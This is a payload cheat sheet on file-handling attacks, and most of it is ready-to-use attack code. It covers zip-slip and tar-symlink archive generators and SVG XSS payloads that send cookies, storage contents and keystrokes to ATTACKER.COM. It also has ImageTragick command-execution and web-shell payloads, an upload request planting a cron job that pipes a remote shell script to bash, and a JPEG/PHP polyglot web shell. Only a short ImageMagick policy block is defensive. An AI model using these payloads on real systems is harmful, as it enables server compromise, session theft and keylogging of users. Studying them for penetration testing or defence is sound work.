# Attack Payloads: File Handling Vulnerabilities

## Zip Slip Payload

### Craft malicious zip with path traversal entry (Python)
```python
#!/usr/bin/env python3
"""
Create a zip file with a traversal entry that writes outside the extraction directory.
Usage: python3 craft_zipslip.py --target /etc/cron.d/evil --payload "* * * * * root curl attacker.com/shell.sh | bash"
"""
import zipfile, argparse, io

parser = argparse.ArgumentParser()
parser.add_argument('--target', default='../../tmp/zipslip_test.txt',
                    help='Path to write (relative to extraction dir)')
parser.add_argument('--payload', default='zipslip_test_payload', help='File content')
parser.add_argument('--output', default='malicious.zip', help='Output zip filename')
args = parser.parse_args()

with zipfile.ZipFile(args.output, 'w') as zf:
    # Normal file to appear legitimate
    zf.writestr('readme.txt', 'Archive contents')
    # Traversal entry
    zf.writestr(args.target, args.payload)

print(f"Created {args.output}")
print(f"Contains traversal entry: {args.target}")
print(f"Upload to target and check if {args.payload[:30]} appears at traversal path")
```

### Craft malicious tar.gz with symlink (zip slip variant)
```python
#!/usr/bin/env python3
import tarfile, io, os

def create_malicious_tar(output_path, link_target='/etc/passwd', traversal_path='../../symlink'):
    """Create tar with a symlink entry pointing outside extraction dir."""
    with tarfile.open(output_path, 'w:gz') as tf:
        # Add a symlink entry
        info = tarfile.TarInfo(name=traversal_path)
        info.type = tarfile.SYMTYPE
        info.linkname = link_target
        tf.addfile(info)
        # Add a file that writes through the symlink
        content = b'evil content\n'
        info2 = tarfile.TarInfo(name=traversal_path + '/injected')
        info2.size = len(content)
        tf.addfile(info2, io.BytesIO(content))
    print(f"Malicious tar created: {output_path}")

create_malicious_tar('malicious.tar.gz')
```

## SVG XSS Payloads

### Basic cookie theft
```xml
<svg xmlns="http://www.w3.org/2000/svg" onload="this.onload=null;fetch('https://ATTACKER.COM/steal?c='+encodeURIComponent(document.cookie))">
  <circle cx="100" cy="100" r="80" fill="blue"/>
</svg>
```

### Session token exfiltration (works when httpOnly=false)
```xml
<svg xmlns="http://www.w3.org/2000/svg">
<script type="text/javascript">
var img = new Image();
img.src = 'https://ATTACKER.COM/steal?cookie=' + encodeURIComponent(document.cookie)
    + '&ls=' + encodeURIComponent(JSON.stringify(localStorage))
    + '&ss=' + encodeURIComponent(JSON.stringify(sessionStorage));
</script>
</svg>
```

### DOM-based keylogger via SVG
```xml
<svg xmlns="http://www.w3.org/2000/svg">
<script>
document.addEventListener('keyup', function(e) {
    fetch('https://ATTACKER.COM/keys?k=' + encodeURIComponent(e.key));
});
</script>
</svg>
```

## ImageMagick MVG/MSL RCE Payloads (ImageTragick — CVE-2016-3714)

### MVG payload — command execution via URL handler
```
push graphic-context
viewbox 0 0 640 480
fill 'url(https://127.0.0.1/"|id; curl https://ATTACKER.COM/`id`|")'
pop graphic-context
```

Save as `exploit.mvg` and upload as image.

### MSL payload — write arbitrary files
```xml
<?xml version="1.0" encoding="UTF-8"?>
<image>
<read filename="caption:&lt;?php system($_GET['cmd']); ?&gt;"/>
<write filename="info:/var/www/html/uploads/shell.php"/>
</image>
```

Save as `exploit.msl`, create a zip containing it named as an image.

### Policy.xml check — what should be blocked
```xml
<!-- /etc/ImageMagick-6/policy.xml — restrictive config -->
<policymap>
  <policy domain="coder" rights="none" pattern="MVG" />
  <policy domain="coder" rights="none" pattern="MSL" />
  <policy domain="coder" rights="none" pattern="LABEL" />
  <policy domain="coder" rights="none" pattern="TEXT" />
  <policy domain="coder" rights="none" pattern="EPHEMERAL" />
  <policy domain="coder" rights="none" pattern="URL" />
  <policy domain="coder" rights="none" pattern="HTTPS" />
  <policy domain="coder" rights="none" pattern="HTTP" />
  <policy domain="coder" rights="none" pattern="FTP" />
</policymap>
```

If policy.xml is missing or these entries are absent, ImageTragick is exploitable.

## Path Traversal via Filename

### Multipart upload with traversal in Content-Disposition
```http
POST /api/upload HTTP/1.1
Host: target.com
Content-Type: multipart/form-data; boundary=----Boundary

------Boundary
Content-Disposition: form-data; name="file"; filename="../../etc/cron.d/backdoor"
Content-Type: text/plain

* * * * * root curl https://attacker.com/shell.sh | bash
------Boundary--
```

### URL-encoded variants
```
filename=..%2F..%2Fetc%2Fpasswd
filename=....//....//etc/passwd
filename=%2e%2e%2f%2e%2e%2fetc%2fpasswd
filename=..%252F..%252Fetc%252Fpasswd  (double URL encoding)
```

## MIME Type / Extension Bypass

### Extension bypass techniques
```
shell.php               # direct
shell.php5              # PHP5 alternate
shell.phtml             # PHP alternate
shell.php.jpg           # double extension (server keeps .php if configured)
shell.php%00.jpg        # null byte truncation (PHP < 5.3.4)
shell.PHP               # case variation on case-sensitive filesystem
.htaccess               # override server config to execute .jpg as PHP
shell.jpg               # legitimate extension + PHP content (if magic bytes ignored)
```

### Polyglot: valid JPEG header + PHP code
```python
#!/usr/bin/env python3
"""Create a file that is both a valid JPEG and contains PHP code."""
jpeg_header = bytes([0xFF, 0xD8, 0xFF, 0xE0, 0x00, 0x10, 0x4A, 0x46, 0x49, 0x46, 0x00, 0x01])
php_payload = b'\n<?php system($_GET["cmd"]); ?>\n'
jpeg_footer = bytes([0xFF, 0xD9])

with open('polyglot.php.jpg', 'wb') as f:
    f.write(jpeg_header)
    f.write(php_payload)
    f.write(jpeg_footer)
print("Created polyglot.php.jpg — passes magic bytes check for JPEG, contains PHP")
```
